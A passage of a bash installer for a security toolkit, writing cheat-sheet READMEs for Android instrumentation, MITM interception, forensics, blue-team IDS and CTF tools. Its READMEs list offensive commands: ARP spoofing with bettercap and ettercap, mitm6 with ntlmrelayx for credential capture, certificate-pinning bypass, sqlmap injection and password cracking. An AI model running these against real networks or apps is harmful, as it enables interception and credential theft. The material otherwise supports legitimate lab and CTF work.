    && echo "[+] Done. Next steps:" \
    && echo "    adb push ${OUTDIR}/frida-server-${FRIDA_VERSION}-android-${ARCH} /data/local/tmp/frida-server" \
    && echo "    adb shell 'su -c \"/data/local/tmp/frida-server &\"'" \
    && echo "    frida-ps -U" \
    || echo "[-] Download failed - check https://github.com/frida/frida/releases"
FRIDA_SCRIPT
sudo chmod +x /usr/local/bin/frida-server-android

sudo tee "$ANDROID_DIR/README.md" >/dev/null << 'ANDROIDREADME'
# Android & Mobile Security Tools

## Installed via APT
- adb: Android Debug Bridge (connect, shell, push, pull, install)
- fastboot: Android bootloader protocol
- apksigner: APK signature verification

## Installed via Snap
- android-studio: Full Android IDE with AVD emulator

## Installed via pip
- frida-tools / frida: Dynamic instrumentation
- objection: Frida-based mobile testing framework
- apkleaks: APK secret/key scanner
- mobsfscan: Static analysis SAST for mobile apps

## Installed via Git
- MobSF: Comprehensive mobile security testing framework
  (mobsf → http://127.0.0.1:8000)

## Frida Server Setup on Android
```bash
# Download and deploy server
frida-server-android arm64         # arm64 for modern phones
frida-server-android x86_64        # for emulators

# Push and run
adb push /opt/security-tools/mitm-interception/frida/frida-server-*-android-arm64 \
         /data/local/tmp/frida-server
adb shell "su -c 'chmod +x /data/local/tmp/frida-server'"
adb shell "su -c '/data/local/tmp/frida-server &'"

# Verify
frida-ps -U
```

## Common adb Commands
```bash
adb devices                           # List connected devices
adb shell                             # Interactive shell
adb install app.apk                   # Install APK
adb pull /data/app/com.pkg/base.apk  # Extract installed APK
adb logcat                            # View device logs
adb logcat | grep -i "password\|flag" # Filter logs
adb shell am start -n com.pkg/.MainActivity  # Launch app
adb shell pm list packages -3         # List 3rd party apps
adb forward tcp:8080 tcp:8080         # Port forwarding
```

## Frida Scripts
```bash
frida -U -f com.target.app --no-pause -l script.js  # Hook on launch
frida -U -n com.target.app -l script.js              # Hook running app
frida-ps -U                                           # List processes
frida-trace -U -i "open*" com.target.app             # Trace function calls

# objection (easier Frida wrapper)
objection -g com.target.app explore
# Inside: android hooking list classes
# Inside: android hooking list class_methods com.target.Class
```

## APK Analysis Workflow
```bash
# 1. Get APK
adb pull /data/app/com.example/base.apk app.apk

# 2. Quick checks  
apkleaks -f app.apk                  # Find secrets
apktool d app.apk -o app_decoded/    # Decode resources + smali
jadx app.apk                         # Java decompilation ⭐

# 3. MobSF full analysis
mobsf   # Start web server
# Upload APK at http://127.0.0.1:8000

# 4. Dynamic analysis
frida-server-android arm64
frida -U -f com.example.app
objection -g com.example.app explore
```

## Rooting (for dynamic analysis)
- KernelSU (preferred): https://kernelsu.org/
- Magisk: https://github.com/topjohnwu/Magisk
- Use production build device (not userdebug) for accurate results
ANDROIDREADME
print_status "Android README written"

# =============================================================================
# SECTION 12: MITM & INTERCEPTION
# =============================================================================
print_header "MITM & Traffic Interception"
MITM_DIR="$BASE/mitm-interception"

safe_apt_install mitmproxy
for pkg in ettercap-text-only dsniff arpwatch sslsniff ssldump netsniff-ng \
           netcat-traditional wireshark tshark tcpdump; do
    safe_apt_install "$pkg"
done
pip_install "mitmproxy"
pip_install "mitm6"

safe_apt_install bettercap
if command_exists go; then
    go_install "github.com/bettercap/bettercap@latest"
fi

sudo tee "$MITM_DIR/README.md" >/dev/null << 'MITMREADME'
# MITM & Traffic Interception Tools

## Installed
- mitmproxy: TLS-capable HTTPS intercepting proxy (CLI + web UI)
- mitmweb: mitmproxy web interface
- ettercap: Full-featured network sniffer/interceptor
- dsniff: Suite for network auditing (sniffing, spoofing)
- bettercap: Network attack and monitoring Swiss army knife
- mitm6: IPv6 MITM attack tool (DHCPv6 + DNS)
- wireshark / tshark: Packet capture and analysis
- tcpdump: Command-line packet capture
- netsniff-ng: High-performance packet toolkit
- Frida: Dynamic instrumentation (in /mitm-interception/frida/)
- Responder: LLMNR/NBT-NS/MDNS poisoner

## Burp Suite (Manual Install)
Download: https://portswigger.net/burp/communitydownload
```bash
# After download:
java -jar burpsuite_community_*.jar
# Configure proxy: 127.0.0.1:8080
# Install cert: visit http://burp/cert in browser
```

## HttpToolkit (Manual Install)
Download: https://httptoolkit.tech/

## Usage Examples
```bash
# mitmproxy - HTTPS interception
mitmproxy -p 8080
mitmweb -p 8080             # Web UI at http://127.0.0.1:8081

# Transparent proxy mode
mitmproxy --mode transparent -p 8080

# bettercap - ARP spoofing
sudo bettercap -iface eth0
# Inside bettercap:
# net.probe on
# set arp.spoof.targets 192.168.1.5
# arp.spoof on
# net.sniff on

# ettercap - ARP MITM
sudo ettercap -G   # GUI
sudo ettercap -T -i eth0 -M arp /target1// /target2//

# mitm6 - IPv6 MITM + credential capture
sudo mitm6 -d domain.local
# (pair with ntlmrelayx in another terminal)
sudo impacket-ntlmrelayx -6 -t smb://target -wh fakewpad -l loot/

# tcpdump capture
sudo tcpdump -i eth0 -w capture.pcap
sudo tcpdump -i eth0 port 80 -A      # HTTP plaintext
sudo tcpdump -i eth0 -nn -s0 -v port 80

# Wireshark filters
# http.request.method == "POST"
# tcp.port == 443
# (ip.src == 192.168.1.5) && (http)
```

## Android HTTPS Interception
```bash
# 1. Set device proxy to PC IP:8080
# 2. Install mitmproxy cert on device
# For apps with cert pinning:
objection -g com.app explore
# Inside: android sslpinning disable
# or use Frida script: https://github.com/WoWTheLegend/frida-scripts
```

## Directories
- Frida scripts: /opt/security-tools/mitm-interception/frida/
- Captures: /opt/security-tools/mitm-interception/captures/
- Certificates: /opt/security-tools/mitm-interception/certificates/
- Scripts: /opt/security-tools/mitm-interception/scripts/
MITMREADME
print_status "MITM README written"

# =============================================================================
# SECTION 13: DIGITAL FORENSICS
# =============================================================================
print_header "Digital Forensics"
DFIR_DIR="$BASE/digital-forensics"

for pkg in sleuthkit bulk-extractor foremost scalpel testdisk recoverjpeg \
           dc3dd dcfldd guymager afflib-tools ewf-tools \
           exiftool exiv2 pst-utils libhivex-bin \
           volatility plaso chkrootkit rkhunter \
           unhide mac-robber safecopy ext4magic extundelete \
           fatcat ssdeep; do
    safe_apt_install "$pkg"
done

pip_install "volatility3"
pip_install "oletools"
pip_install "pcodedmp"
pip_install "dpkt"
pip_install "pyshark"

# Chainsaw
CHAINSAW_DIR="$DFIR_DIR/chainsaw"
if [ ! -d "$CHAINSAW_DIR" ] && command_exists cargo; then
    git_clone_tool "https://github.com/WithSecureLabs/chainsaw.git" \
        "$CHAINSAW_DIR" "Chainsaw"
    cd "$CHAINSAW_DIR" && cargo build --release 2>/dev/null \
        && sudo ln -sf "$CHAINSAW_DIR/target/release/chainsaw" /usr/local/bin/chainsaw \
        && print_status "Chainsaw built" \
        || print_warning "Chainsaw build failed"
    cd - >/dev/null
fi

# PCAP helper
sudo tee /usr/local/bin/pcap-analyze >/dev/null << 'PCAPAN'
#!/bin/bash
FILE="${1:-}"
if [ -z "$FILE" ] || [ ! -f "$FILE" ]; then
    echo "Usage: pcap-analyze <file.pcap>"
    echo "Runs: protocol summary, HTTP extract, DNS queries, file carving"
    exit 0
fi
echo "=== PCAP Analysis: $FILE ==="
echo "--- Protocol Hierarchy ---"
tshark -r "$FILE" -q -z io,phs 2>/dev/null
echo "--- HTTP Requests ---"
tshark -r "$FILE" -Y http.request -T fields \
    -e http.host -e http.request.uri 2>/dev/null | head -30
echo "--- DNS Queries ---"
tshark -r "$FILE" -Y dns.qry.name -T fields -e dns.qry.name 2>/dev/null \
    | sort -u | head -30
echo "--- Extracting HTTP Objects -> ./pcap_objects/ ---"
mkdir -p ./pcap_objects
tshark -r "$FILE" --export-objects "http,./pcap_objects" 2>/dev/null \
    && echo "[+] Objects in ./pcap_objects/"
echo "--- File Carving with foremost -> ./pcap_carved/ ---"
mkdir -p ./pcap_carved
foremost -i "$FILE" -o ./pcap_carved 2>/dev/null \
    && echo "[+] Carved files in ./pcap_carved/"
PCAPAN
sudo chmod +x /usr/local/bin/pcap-analyze

# Docker forensics helper (from SHMOOCON notes)
sudo tee /usr/local/bin/docker-forensics >/dev/null << 'DOCKERFOR'
#!/bin/bash
IMAGE="${1:-}"
if [ -z "$IMAGE" ]; then
    echo "Usage: docker-forensics <image:tag>"
    echo "Inspects Docker image layers, env vars, history, secrets"
    echo ""
    echo "Techniques (from SHMOOCON CTF notes):"
    echo "  docker history --no-trunc <image>      # Layer history & commands"
    echo "  docker inspect <image>                 # Full metadata JSON"
    echo "  docker run --rm -it <image> env        # Environment variables"
    echo "  docker run --rm -it <image> cat /etc/passwd"
    echo "  docker save <image> | tar xv           # Extract all layer tarballs"
    echo "  dive <image>                           # Interactive layer explorer"
    exit 0
fi
echo "=== Docker Forensics: $IMAGE ==="
echo "--- Layer History ---"
docker history --no-trunc "$IMAGE" 2>/dev/null
echo ""
echo "--- Env / Cmd / Labels ---"
docker inspect "$IMAGE" 2>/dev/null \
    | python3 -m json.tool \
    | grep -E '"Env|"Cmd|"Entrypoint|"Labels|"WorkingDir'
DOCKERFOR
sudo chmod +x /usr/local/bin/docker-forensics

sudo tee "$DFIR_DIR/README.md" >/dev/null << 'DFIRREADME'
# Digital Forensics Tools

## Installed via APT
- sleuthkit: Disk image analysis (mmls, fls, icat, fsstat...)
- bulk_extractor: High-speed data carving (emails, URLs, cards, keys)
- foremost: File carving by header/footer signatures
- scalpel: Configurable file carver
- testdisk: Partition and file recovery
- recoverjpeg: JPEG recovery from raw images
- dc3dd / dcfldd: Enhanced forensic dd with hashing
- guymager: GUI forensic disk imager
- afflib-tools: AFF disk image tools
- ewf-tools: Expert Witness Format (E01) tools
- exiftool: Universal metadata reader/editor
- volatility: Memory forensics (legacy)
- volatility3: Memory forensics (modern Python 3)
- chkrootkit / rkhunter / unhide: Rootkit detection
- oletools: Microsoft Office malware analysis
- ssdeep: Fuzzy hashing for similarity matching
- chainsaw: Windows event log analysis (Sigma rules)

## Usage Examples
```bash
# Disk image acquisition
dc3dd if=/dev/sda of=disk.img hash=sha256 log=acquisition.log
guymager   # GUI acquisition with verification

# Disk analysis
mmls disk.img                          # Partition table
fsstat -o 2048 disk.img               # Filesystem stats
fls -r -o 2048 disk.img               # File listing
icat -o 2048 disk.img 42 > file.dat   # Extract file by inode

# File carving
foremost -i disk.img -o output/
bulk_extractor -o output/ disk.img
scalpel disk.img -o scalpel_output/

# Memory forensics
vol -f memory.dmp windows.pslist       # Process list
vol -f memory.dmp windows.netscan      # Network connections
vol -f memory.dmp windows.dumpfiles    # Extract files
vol -f memory.dmp windows.hashdump     # Extract password hashes
vol -f memory.dmp linux.bash           # Bash history

# PCAP analysis (from SHMOOCON notes)
pcap-analyze capture.pcap             # Automated triage
wireshark capture.pcap                # GUI
tshark -r cap.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri
tshark -r cap.pcap --export-objects "http,./objects/"

# Docker forensics (from SHMOOCON notes)
docker-forensics image:tag
docker history --no-trunc image:tag
docker save image:tag | tar xv        # Extract all layers
# Look for: hardcoded secrets, SSH keys, env vars, commands in history

# Windows event logs (Chainsaw)
chainsaw hunt /evtx/ -s /opt/security-tools/detection-analysis/sigma-rules/
chainsaw search -t 'EventID: 4625' /evtx/  # Failed logins

# Office malware
olevba malware.doc                     # Extract VBA macros
oleid malware.doc                      # Quick indicator check
mraptor malware.doc                    # Macro rapid triage

# Metadata
exiftool image.jpg
exiftool -all= image.jpg               # Strip all metadata
```

## Directories
- Case working directory: /opt/security-tools/digital-forensics/cases/
- Memory dumps: /opt/security-tools/digital-forensics/memory/
DFIRREADME
print_status "Digital forensics README written"

# =============================================================================
# SECTION 14: BLUE TEAM / DEFENSIVE
# =============================================================================
print_header "Blue Team & Defensive Tools"
BLUE_DIR="$BASE/blue-team"

for pkg in suricata zeek yara aide auditd sysstat \
           iftop iotop nethogs tcpflow ngrep p0f \
           fail2ban lynis; do
    safe_apt_install "$pkg"
done

echo "snort snort/address_range string 192.168.0.0/16" | sudo debconf-set-selections
echo "snort snort/interface string any"                 | sudo debconf-set-selections
sudo DEBIAN_FRONTEND=noninteractive apt install -y snort 2>/dev/null \
    || print_warning "Snort install failed"

safe_apt_install clamav; safe_apt_install clamav-daemon
safe_apt_install rkhunter; safe_apt_install chkrootkit

# YARA rules
YARA_DIR="$BASE/detection-analysis/yara-rules"
[ ! -d "$YARA_DIR/yara-community" ] && \
    git_clone_tool "https://github.com/Yara-Rules/rules.git" \
        "$YARA_DIR/yara-community" "YARA community rules"
[ ! -d "$YARA_DIR/signature-base" ] && \
    git_clone_tool "https://github.com/Neo23x0/signature-base.git" \
        "$YARA_DIR/signature-base" "Neo23x0 signature-base"

# Sigma
SIGMA_DIR="$BASE/detection-analysis/sigma-rules"
[ ! -d "$SIGMA_DIR" ] && \
    git_clone_tool "https://github.com/SigmaHQ/sigma.git" "$SIGMA_DIR" "Sigma rules"
pip_install "sigma-cli"
pip_install "pymisp"

# Suricata rules
if command_exists suricata; then
    sudo suricata-update 2>/dev/null || true
fi
[ command_exists freshclam ] && sudo freshclam 2>/dev/null || true

# Velociraptor
if ! command_exists velociraptor; then
    VR_URL=$(curl -sf "https://api.github.com/repos/Velocidex/velociraptor/releases/latest" \
        | grep -Po '"browser_download_url":\s*"\K[^"]+linux-amd64[^"]*"' \
        | tr -d '"' | grep -v ".sig" | head -1)
    [ -n "$VR_URL" ] && sudo wget -qO /usr/local/bin/velociraptor "$VR_URL" \
        && sudo chmod +x /usr/local/bin/velociraptor \
        && print_status "Velociraptor installed" \
        || print_warning "Velociraptor download failed"
fi

sudo tee "$BLUE_DIR/README.md" >/dev/null << 'BLUEREADME'
# Blue Team & Defensive Security Tools

## Network Monitoring / IDS
- suricata: High-performance IDS/IPS/NSM
- zeek: Network security monitor (formerly Bro)
- snort: Classic network intrusion detection
- p0f: Passive OS fingerprinting and traffic analysis
- ngrep: Network grep - filter packets by content
- tcpflow: Reconstruct TCP streams

## Host-Based Detection
- yara: Pattern matching for malware detection
- aide: File integrity monitoring (tripwire alternative)
- auditd: Linux audit daemon (syscall/file monitoring)
- rkhunter / chkrootkit / unhide: Rootkit detection
- clamav: Antivirus scanning
- lynis: Security auditing and hardening advisor
- fail2ban: Automatic IP banning after failed logins

## DFIR Platforms
- velociraptor: DFIR platform (collection, hunting, monitoring)

## Rule Sets
- YARA community rules: /opt/security-tools/detection-analysis/yara-rules/yara-community/
- Neo23x0 YARA rules: /opt/security-tools/detection-analysis/yara-rules/signature-base/
- Sigma rules: /opt/security-tools/detection-analysis/sigma-rules/

## Usage Examples
```bash
# Suricata (IDS mode)
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
sudo suricata-update          # Update rules

# Zeek
sudo zeek -i eth0             # Live capture
zeek -r capture.pcap          # Analyze PCAP
# Logs: conn.log, http.log, dns.log, ssl.log, files.log

# Snort
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0

# YARA scanning
yara rules.yar suspicious_file
yara -r /opt/security-tools/detection-analysis/yara-rules/yara-community/malware/ file
yara /opt/security-tools/detection-analysis/yara-rules/signature-base/*.yar file

# Sigma rule conversion
sigma convert -t splunk rule.yml
sigma convert -t elasticsearch rule.yml

# ClamAV
sudo freshclam                               # Update signatures
clamscan -r /path/to/scan --infected
clamscan -r --infected --move=/quarantine/ /path/

# File integrity
sudo aide --init                             # Initialize database
sudo aide --check                            # Check for changes

# Rootkit checks
sudo rkhunter --check
sudo chkrootkit
sudo unhide proc

# System audit
sudo lynis audit system

# Velociraptor
velociraptor gui                             # Start web UI
```

## Directories
- Blue team logs: /opt/security-tools/blue-team/logs/
- Detection rules: /opt/security-tools/blue-team/rules/
- Alerts: /opt/security-tools/blue-team/alerts/
- YARA rules: /opt/security-tools/detection-analysis/yara-rules/
- Sigma rules: /opt/security-tools/detection-analysis/sigma-rules/
- Scan results: /opt/security-tools/detection-analysis/scan-results/
- Quarantine: /opt/security-tools/detection-analysis/quarantine/
BLUEREADME
print_status "Blue team README written"

# =============================================================================
# SECTION 15: CTF SPECIFIC TOOLS
# =============================================================================
print_header "CTF-Specific Tools"
CTF_DIR="$BASE/ctf"

# Crypto
for p in pycryptodome gmpy2 sympy "z3-solver" cryptography pyOpenSSL \
         "RSACTFTool" xortool factordb-python primefac base58 base62; do
    pip_install "$p"
done
safe_apt_install sagemath
safe_apt_install openssl

# Steganography
for pkg in steghide stegsnow outguess imagemagick exiftool \
           fcrackzip pngcheck zbar-tools qrencode sox ffmpeg; do
    safe_apt_install "$pkg"
done
github_deb_install "RickdeJager/stegseek" "stegseek.*\.deb$" "stegseek"
git_clone_tool "https://github.com/DominicBreuker/stego-toolkit.git" \
    "$CTF_DIR/stego/stego-toolkit" "stego-toolkit"
pip_install "stegcracker"
pip_install "Pillow"
pip_install "numpy"
pip_install "scipy"

# PWN
pip_install "pwntools"
safe_apt_install patchelf
safe_apt_install gcc-multilib
safe_apt_install g++-multilib
gem_install "one_gadget"
gem_install "seccomp-tools"

# OSINT
pip_install "shodan"
pip_install "censys"
pip_install "instaloader"
safe_apt_install maltego

# Web CTF
for p in requests beautifulsoup4 flask httpx aiohttp selenium mechanize; do
    pip_install "$p"
done

# Docker for exploitation dev
safe_apt_install docker.io
safe_apt_install docker-compose
if command_exists docker; then
    sudo usermod -aG docker "$USER"
    sudo systemctl enable --now docker 2>/dev/null || true
    # Kali Docker
    docker pull kalilinux/kali-rolling 2>/dev/null \
        && print_status "Kali Docker image pulled" \
        || print_warning "Kali Docker pull failed (no network or no docker)"
    sudo tee /usr/local/bin/kali >/dev/null << 'EOF'
#!/bin/bash
docker run -it --rm \
    --net=host \
    -v /opt/security-tools:/opt/security-tools \
    -v "$HOME:/root/host" \
    kalilinux/kali-rolling \
    /bin/bash
EOF
    sudo chmod +x /usr/local/bin/kali
    print_status "Run 'kali' for a full Kali Linux shell"
fi

# Encoding/decode helpers
sudo tee /usr/local/bin/ctf-decode >/dev/null << 'CTFDECODE'
#!/bin/bash
# CTF Quick Decoder - covers common CTF encoding tricks (from THOTCON notes)
INPUT="$1"; METHOD="${2:-auto}"
if [ -z "$INPUT" ]; then
    echo "CTF Quick Decoder"
    echo "Usage: ctf-decode <string> [method]"
    echo "Methods: auto base64 rot13 rot<N> hex binary"
    echo ""
    echo "Examples (THOTCON flags):"
    echo "  ctf-decode 'RmxhZ3tiYXNlNjRfaXNfZWFzeX0='  base64"
    echo "  ctf-decode 'Ykj pynih fgl'                   rot13"
    echo "  ctf-decode 'Ftue ue FTAFOAZ'                 rot12"
    exit 0
fi
case "$METHOD" in
    base64) echo "[base64] $(echo "$INPUT" | base64 -d 2>/dev/null)" ;;
    rot13)  echo "[ROT13]  $(echo "$INPUT" | tr 'A-Za-z' 'N-ZA-Mn-za-m')" ;;
    rot*)
        N="${METHOD#rot}"
        result=$(echo "$INPUT" | python3 -c "
import sys; s=sys.stdin.read().strip(); n=int('$N')
print(''.join(chr((ord(c)-65+n)%26+65) if c.isupper() else chr((ord(c)-97+n)%26+97) if c.islower() else c for c in s))")
        echo "[ROT$N] $result" ;;
    hex)    echo "[hex]    $(echo "$INPUT" | xxd -r -p 2>/dev/null)" ;;
    binary) echo "[binary] $(echo "$INPUT" | tr -d ' ' | python3 -c "
import sys; b=sys.stdin.read().strip()
print(''.join(chr(int(b[i:i+8],2)) for i in range(0,len(b),8) if len(b[i:i+8])==8))")" ;;
    auto|*)
        echo "=== Auto-decode: $INPUT ==="
        echo -n "[base64]  "; echo "$INPUT" | base64 -d 2>/dev/null; echo
        echo "[ROT13]   $(echo "$INPUT" | tr 'A-Za-z' 'N-ZA-Mn-za-m')"
        echo -n "[hex->txt] "; echo "$INPUT" | xxd -r -p 2>/dev/null; echo
        for rot in 1 3 5 7 10 12 15 18 21 25; do
            result=$(echo "$INPUT" | python3 -c "
import sys; s=sys.stdin.read().strip(); n=$rot
print(''.join(chr((ord(c)-65+n)%26+65) if c.isupper() else chr((ord(c)-97+n)%26+97) if c.islower() else c for c in s))")
            echo "[ROT$rot] $result"
        done ;;
esac
CTFDECODE
sudo chmod +x /usr/local/bin/ctf-decode

# dcode.fr launcher
sudo tee /usr/local/bin/dcode >/dev/null << 'EOF'
#!/bin/bash
python3 -m webbrowser "https://www.dcode.fr/" 2>/dev/null \
    || xdg-open "https://www.dcode.fr/" 2>/dev/null \
    || echo "Open: https://www.dcode.fr/"
EOF
sudo chmod +x /usr/local/bin/dcode

# Aperisolve launcher
sudo tee /usr/local/bin/aperisolve >/dev/null << 'EOF'
#!/bin/bash
echo "[*] Aperisolve: all-in-one steg analysis - https://www.aperisolve.com/"
python3 -m webbrowser "https://www.aperisolve.com/" 2>/dev/null \
    || xdg-open "https://www.aperisolve.com/" 2>/dev/null \
    || echo "Open: https://www.aperisolve.com/"
EOF
sudo chmod +x /usr/local/bin/aperisolve

sudo tee "$CTF_DIR/README.md" >/dev/null << 'CTFREADME'
# CTF Tools & Techniques

## Quick Reference Commands
```bash
ctf-tools        # Full cheatsheet in terminal
ctf-decode       # Decode ROT/base64/hex/binary
dcode            # Open dcode.fr cipher tool
cyberchef        # Open CyberChef encoder/decoder
aperisolve       # Open aperisolve.com steg tool
```

## Crypto / Encoding (from THOTCON CTF notes)
```bash
# Base64
echo 'RmxhZ3tiYXNlNjRfaXNfZWFzeX0=' | base64 -d
# -> flag{base64_is_easy}

# ROT13
echo 'Ykj pynih' | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Auto try all ROT values (find ROT12 result for THOTCON challenge)
ctf-decode 'Ftue ue FTAFOAZ 0jO' auto
# ROT12 -> "This is THOTCON 0xC"

# RSA attacks
RSACTFTool --publickey public.pem --attack all
RSACTFTool --n N --e E --uncipher CIPHER

# XOR analysis
xortool -x -c ' ' encrypted.bin    # Guess key length
xortool-xor -r key.bin -f encrypted.bin > decrypted.bin

# Useful sites
# https://www.dcode.fr/        - cipher identification and decode
# https://gchq.github.io/CyberChef/  - all-in-one encoding
```

## Steganography (from CTF notes)
```bash
# Quick checks first
strings image.jpg | grep -i flag
file image.jpg
exiftool image.jpg
binwalk image.jpg
binwalk -e image.jpg    # Extract embedded files

# Aperisolve (from notes) - submit image, runs everything
aperisolve

# steghide
steghide info image.jpg                   # Check for data
steghide extract -sf image.jpg            # Extract (prompts for password)
steghide extract -sf image.jpg -p ""     # Try empty password
stegseek image.jpg /opt/security-tools/wordlists/rockyou.txt  # Crack password

# Other tools
stegsnow -C file.txt                      # Whitespace steganography
outguess -r image.jpg output.txt          # Outguess extraction
zbarimg image.png                         # QR/barcode decode
imagemagick: identify -verbose image.jpg

# Audio steganography
sox suspicious.wav -t raw out.raw         # Convert for analysis
audacity suspicious.wav                   # Open in GUI, check spectrogram

# Online: https://www.aperisolve.com/
```

## PWN / Binary Exploitation
```bash
checksec ./binary                         # Check protections
file ./binary                             # Architecture
strings ./binary | grep flag
strace ./binary                           # Syscall trace
ltrace ./binary                           # Library call trace

gdb ./binary                              # Debug (GEF auto-loads)
# GEF inside GDB:
pattern create 200                        # Generate cyclic pattern
pattern offset $rsp                       # Find offset

ROPgadget --binary ./binary               # Find ROP gadgets
one_gadget /lib/x86_64-linux-gnu/libc.so.6  # One-shot ROP gadget

# pwntools template
from pwn import *
context.arch = 'amd64'
elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./binary')
# or: p = remote('target', port)
p.sendline(b'A' * offset + p64(ret_addr))
p.interactive()
```

## Forensics (from SHMOOCON notes)
```bash
# PCAP triage
pcap-analyze capture.pcap
wireshark capture.pcap
# Filters: http.request / dns / tcp.stream eq 0

# Docker image forensics (from SHMOOCON)
docker-forensics image:tag
docker history --no-trunc image:tag
docker save image | tar xv
# Inspect each layer's .tar for secrets

# AWS enumeration
# aws s3 ls s3://bucket-name
# aws sts get-caller-identity
# aws iam list-users

# Memory forensics
vol -f memory.raw windows.pslist
vol -f memory.raw windows.cmdline
vol -f memory.raw windows.filescan | grep flag
```

## Web CTF
```bash
# See /opt/security-tools/ctf/web/QUICKREF.md
ffuf -w wordlist.txt -u http://t/FUZZ
sqlmap -u 'http://t/?id=1' --dbs
curl -v -X POST -d 'data' http://target
```

## Useful CTF Links (from notes)
- https://gchq.github.io/CyberChef/
- https://www.dcode.fr/
- https://www.aperisolve.com/
- https://cantreally.cyou/   (writeups)
- https://python-can.readthedocs.io/en/stable/
- https://github.com/iDoka/awesome-canbus

## Event-Specific Notes
- THOTCON: Badge ESP32 dump → esp32-dump
- SHMOOCON: QR layers, STL Blender, PCAP, Docker layers
- HACK-A-SAT: RF/satellite protocol, telemetry parsing
- Battelle: RE challenges (Ghidra), PWN (ROPchain), Forensics
- Car Hacking Village: TruckDevil, CAN bus sniffing
CTFREADME
print_status "CTF README written"

# Web CTF quickref
sudo mkdir -p "$CTF_DIR/web"
sudo tee "$CTF_DIR/web/QUICKREF.md" >/dev/null << 'WEBCTFREF'
# Web CTF Quick Reference

## ffuf (from CTF notes: https://medium.com/quiknapp/fuzz-faster-with-ffuf-c18c031fc480)
ffuf -w wordlist.txt -u http://t/FUZZ                          # Directory
ffuf -w wordlist.txt -u http://t/?param=FUZZ                   # Parameter
ffuf -w wordlist.txt -u http://t/ -H "Cookie: session=FUZZ"   # Cookie
ffuf -w users.txt:U -w passwords.txt:P -u http://t/ \
     -d "u=U&p=P" -fc 401                                      # Cluster bomb

## SQLi
sqlmap -u "http://t/?id=1" --dbs
sqlmap -u "http://t/?id=1" -D db --tables
sqlmap -u "http://t/login" --data="user=a&pass=b" --dbs

## Quick Curl
curl -v http://target                        # Verbose
curl -X POST -d "param=value" http://target  # POST
curl -b "cookie=value" http://target         # Cookie
curl -H "Authorization: Bearer TOKEN" http://target
curl -k https://target                       # Skip SSL verify
curl -L http://target                        # Follow redirects

## Useful Sites
# https://gchq.github.io/CyberChef/
# https://www.dcode.fr/
# https://cantreally.cyou/
WEBCTFREF

# =============================================================================
# SECTION 16: MASTER CTF CHEATSHEET COMMAND
# =============================================================================
print_section "CTF Cheatsheet Command"

sudo tee /usr/local/bin/ctf-tools >/dev/null << 'CTFTOOLS'
#!/bin/bash
echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║           CTF TOOLS QUICK REFERENCE                  ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""
echo "── HARDWARE / ESP32 ─────────────────────────────────"
echo "  esp32-dump [port] [baud] [out]    Dump ESP32 flash (esptool)"
echo "  serial-connect [port] [baud]      Quick picocom serial connect"
echo "  i2c-decode '42 44 47 FF'          Decode I2C hex bytes to ASCII"
echo "  lsusb && ls /dev/tty*             Find connected USB devices"
echo "  picocom /dev/ttyUSB0 -b 115200    Serial terminal"
echo "  Baud rates to try: 9600 115200 57600 38400 19200 4800 1200"
echo ""
echo "── CAN BUS ──────────────────────────────────────────"
echo "  can-setup                          Full CAN interface guide"
echo "  candump vcan0                      Sniff all CAN frames"
echo "  cansend vcan0 123#DEADBEEF         Send a CAN frame"
echo "  truckdevil -i can0                 J1939 heavy truck tool"
echo "  cc discovery -h                    CaringCaribou UDS scanner"
echo "  cd /opt/security-tools/canbus/ICSim && ./icsim vcan0"
echo ""
echo "── RF / SDR ─────────────────────────────────────────"
echo "  gqrx                               GUI SDR receiver"
echo "  urh                                Universal Radio Hacker"
echo "  rtl_test                           Test RTL-SDR dongle"
echo "  multimon-ng -t wav -a ALL f.wav    Decode RF signals"
echo "  multimon-ng -t raw -a MORSE        Decode Morse from audio"
echo "  inspectrum capture.cfile           Signal analysis"
echo "  rtl_433                            Decode 433MHz devices"
echo "  cat /opt/security-tools/rf-sdr/MOBILE_APPS_REFERENCE.md"
echo ""
echo "── STEGANOGRAPHY ────────────────────────────────────"
echo "  aperisolve [img]                   Open aperisolve.com"
echo "  stegseek image.jpg rockyou.txt     Fast steghide crack"
echo "  steghide extract -sf image.jpg     Extract steghide data"
echo "  stegsnow -C file.txt               Snow whitespace steg"
echo "  zbarimg image.png                  Decode QR/barcodes"
echo "  exiftool image.jpg                 Read metadata"
echo "  strings image.jpg | grep flag      String hunt"
echo "  binwalk -e image.jpg               Extract embedded files"
echo ""
echo "── CRYPTO / ENCODING ────────────────────────────────"
echo "  ctf-decode <str> [method]          ROT/base64/hex/binary/auto"
echo "  dcode                              Open dcode.fr"
echo "  cyberchef                          Open CyberChef"
echo "  echo 'x' | base64 -d              Decode base64"
echo "  echo 'x' | tr A-Za-z N-ZA-Mn-za-m  ROT13"
echo "  RSACTFTool --publickey k.pub --attack all"
echo "  xortool -x -c ' ' file.bin         XOR analysis"
echo ""
echo "── WEB ──────────────────────────────────────────────"
echo "  ffuf -w wl.txt -u http://t/FUZZ   Directory fuzz"
echo "  sqlmap -u 'http://t/?id=1' --dbs  SQL injection"
echo "  cat /opt/security-tools/ctf/web/QUICKREF.md"
echo ""
echo "── FORENSICS ────────────────────────────────────────"
echo "  pcap-analyze file.pcap             Automated PCAP triage"
echo "  docker-forensics image:tag         Docker layer inspection"
echo "  vol -f mem.dmp windows.pslist      Memory forensics"
echo "  binwalk -e firmware.bin            Firmware extraction"
echo "  foremost -i file -o out/           File carving"
echo "  exiftool file                      Metadata"
echo ""
echo "── PWN ──────────────────────────────────────────────"
echo "  checksec binary                    Check protections"
echo "  ROPgadget --binary binary          Find ROP gadgets"
echo "  one_gadget /lib/x86_64-linux-gnu/libc.so.6"
echo "  gdb binary   (GEF auto-loads)"
echo ""
echo "── NETWORK / RE ─────────────────────────────────────"
echo "  nmap -sS -sV target               Port + service scan"
echo "  mitmproxy -p 8080                 HTTPS interception"
echo "  jadx app.apk                      Decompile Android APK"
echo "  r2 binary / ghidra binary         Reverse engineering"
echo "  frida-ps -U                       List Android processes"
echo ""
echo "── USEFUL LINKS ─────────────────────────────────────"
echo "  https://gchq.github.io/CyberChef/"
echo "  https://www.dcode.fr/"
echo "  https://www.aperisolve.com/"
echo "  https://cantreally.cyou/"
echo "  https://github.com/iDoka/awesome-canbus"
